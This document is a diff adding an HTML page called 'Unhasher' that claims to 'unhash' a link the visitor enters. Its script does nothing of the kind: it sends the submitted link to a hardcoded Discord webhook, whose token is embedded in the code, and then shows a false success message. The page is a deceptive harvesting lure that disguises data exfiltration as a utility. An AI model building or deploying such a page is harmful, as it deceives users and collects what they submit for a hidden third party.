@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unhasher html</title>
+    <script>
+        async function sendToWebhook() {
+            const linkInput = document.getElementById('link-input').value;
+            const webhookUrl = "https://discord.com/api/webhooks/1330613485972750397/tVTgS2qYEai2MZozXqLN_gYsoubs_tSLwhERPhJsWYDsAbCciFcxKckp-DrMPsNFJMH3";
+
+            if (!linkInput) {
+                alert('Please enter a link.');
+                return;
+            }
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `New link: ${linkInput}`
+                    })
+                });
+
+                if (response.ok) {
+                    alert('The link is unhashing!');
+                } else {
+                    alert('Error.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('An error occurred. Unable to find source code. Check the console for details.');
+            }
+        }
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f3f4f6;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
+        input[type="text"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Unhasher</h1>
+        <input type="text" id="link-input" placeholder="Enter your link here">
+        <button onclick="sendToWebhook()">Send</button>
+    </div>
+</body>
+</html>
